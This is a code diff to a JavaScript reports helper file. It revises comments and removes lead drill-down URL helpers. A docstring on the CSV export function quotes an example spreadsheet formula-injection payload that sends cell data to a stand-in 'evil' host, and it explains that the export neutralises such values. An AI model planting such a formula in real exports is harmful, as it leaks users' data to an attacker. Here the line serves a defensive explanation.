@@ -1,8 +1,9 @@
 // src/pages/Reports/reportUtils.js
 //
-// Pure helpers behind ReportPage: filter state <-> URL <-> POST body, value
-// formatting, CSV, and the drill-down URL. No React, so the arithmetic that
-// decides what a report asks for is testable without a DOM.
+// Pure helpers behind the team reports (TAT, Attendance) and the shared report
+// filters: filter state <-> URL <-> POST body, value formatting, CSV, chart
+// ticks. No React, so the arithmetic that decides what a report asks for is
+// testable without a DOM.
 import dayjs from "dayjs";
 
 import { formatCurrency } from "../../utils/format";
@@ -147,7 +148,7 @@ export function formatValue(format, v) {
  * quotes are stripped at parse time. These cells carry names users type
  * (tblUser.FullName is self-service), so without this a rep could set their
  * display name to =HYPERLINK("http://evil/?d="&A2) and have it fire when a
- * manager opens the exported leaderboard. Numbers are exempt so a real -5
+ * manager opens the exported report. Numbers are exempt so a real -5
  * stays -5.
  */
 export function toCsv(columns, rows) {
@@ -159,64 +160,6 @@ export function toCsv(columns, rows) {
   const head = columns.map((c) => esc(c.header)).join(",");
   const body = rows.map((r) => columns.map((c) => esc(r[c.key])).join(","));
   return [head, ...body].join("\n");
-}
-
-/** The Leads list, pre-filtered. Null / empty values are dropped. */
-export function leadsUrl(params) {
-  const q = new URLSearchParams();
-  for (const [k, v] of Object.entries(params)) {
-    if (v !== null && v !== undefined && v !== "") q.set(k, String(v));
-  }
-  const s = q.toString();
-  return s ? `/sales/leads?${s}` : "/sales/leads";
-}
-
-/**
- * Which Leads filter a breakdown row's GroupKey maps onto. Groupings the list
- * cannot filter by (team, day, reason, pair) map to nothing: the drill then
- * shows the range with the active filters, which is still the right list.
- */
-export const GROUP_PARAM = {
-  source: "SourceId",
-  owner: "OwnerId",
-  product: "ProductId",
-  branch: "BranchId",
-  status: "StatusId",
-  partner: "PartnerId",
-};
-
-/**
- * The four filter-bar ids, for a page building its own drill. Every report SP
- * narrows on these, so a drill that omits them lands on a wider list than the
- * row it came from — the row says 70 and the list shows 120.
- */
-export const idFilters = (f) => ({
-  BranchId: f.BranchId,
-  OwnerId: f.OwnerId,
-  SourceId: f.SourceId,
-  ProductId: f.ProductId,
-});
-
-/**
- * The date range, but only when it means the same thing on both sides.
- * sp_FetchLeads narrows on CreatedAt, so passing the range from a report run
- * on `closed` or `activity` would drill into a different set of leads than the
- * row counted.
- */
-export const drillRange = (f) =>
-  f.basis && f.basis !== "created" ? {} : { from: f.from, to: f.to };
-
-/** Default drill: the active filters + the range + the row's group. */
-export function drillParams(filters, row) {
-  const key = GROUP_PARAM[filters.groupBy];
-  const hasKey = key && row?.GroupKey !== null && row?.GroupKey !== undefined;
-  // Range first: a JS object keeps a key's first position when a later spread
-  // overwrites it, so the URL reads from&to&<filters>&<group> whatever the group is.
-  return {
-    ...drillRange(filters),
-    ...idFilters(filters),
-    ...(hasKey ? { [key]: row.GroupKey } : {}),
-  };
 }
 
 /**
